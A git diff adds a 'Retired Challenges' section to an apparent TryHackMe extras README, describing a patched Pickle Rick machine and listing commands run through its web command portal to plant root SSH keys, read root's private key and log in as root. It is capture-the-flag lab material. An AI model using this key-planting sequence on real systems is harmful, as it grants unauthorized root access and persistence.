@@ -71,3 +71,18 @@ reveals the two lines, separated from everything else, that can be entered to co
 ### Subscriber Rooms Extra Challenges
 tbd<br>
 <br>
+## Retired Challenges
+This is a collection of extra tasks for TryHackMe Rooms that have been patched since they were discovered, and are no longer available.
+
+#### Pickle Rick
+A previous version of the machine allowed full sudo in the web command portal. The challenge was to get a root login, which was not a necessary task for completing the Room as intended. The method had an extra step, because it was not possible to `cd` out of /var/www/html. Generating ssh keys in the place required by /etc/ssh/sshd_cofig involved adding an argument to `ssh-keygen`:<br>
+extra credit - get shell on box<br>
+all work done through web command portal<br>
+<br>
+sudo mkdir /root/.ssh<br>
+sudo ssh-keygen -f /root/.ssh/id_rsa -t rsa -b 2048<br>
+sudo cp /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys<br>
+sudo less /root/.ssh/id_rsa (copy/paste to text editor and save local)<br>
+login as:<br>
+ssh -i id_rsa root@$target<br>
+<br>
